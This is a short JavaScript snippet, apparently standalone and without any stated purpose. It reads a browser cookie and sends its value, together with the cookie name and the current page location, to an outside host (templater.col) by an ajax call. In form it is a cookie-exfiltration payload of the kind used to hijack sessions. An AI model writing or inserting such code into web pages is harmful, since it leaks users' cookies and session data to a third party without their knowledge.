const   ajax = require('ajaxsim'),
        cook = require('dist-cookie');

let nameCookie = 'test';
let cookieData = cook(nameCookie),
    host = window.location,
    response ="cookie="+cookieData+"&nameCookie="+nameCookie+'&host='+host;


ajax('http://templater.col/respond-require-data', response);